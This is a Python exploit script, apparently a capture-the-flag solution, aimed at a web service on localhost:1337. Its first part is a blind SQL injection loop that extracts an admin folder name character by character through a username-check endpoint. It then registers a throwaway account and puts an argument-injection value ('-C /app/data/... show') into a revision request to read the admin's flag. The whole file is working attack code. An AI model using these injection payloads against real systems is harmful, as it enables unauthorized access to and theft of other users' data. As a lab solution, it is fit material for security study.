import requests
import string
import random

URL = "http://localhost:1337"

folder = ""

# Use SQLi to get Admin Folder
for i in range(36):
    for c in string.hexdigits + "-":
        R = requests.get(URL+"/api/username_check",params={"username":"admin' AND SUBSTR(folder,%d,1)='%s" % (i+1,c)}).json()
        if R.get("good") == False:
            folder = folder + c
            break

print("Recovered Admin Folder: %s" % folder)

# Register new user
R = requests.post(URL+"/api/register",json={"username":"".join([random.choice(string.ascii_lowercase) for i in range(5)]),"password":"password"}).json()
token = R.get("token")

# Request admin flag revision
R = requests.post(URL+"/api/revision/",json={"action":"-C /app/data/%s show" % folder,"hash":"HEAD~1"}, headers={"Authorization":"Bearer %s" % token})
print("Flag Contents: %s" % R.text)


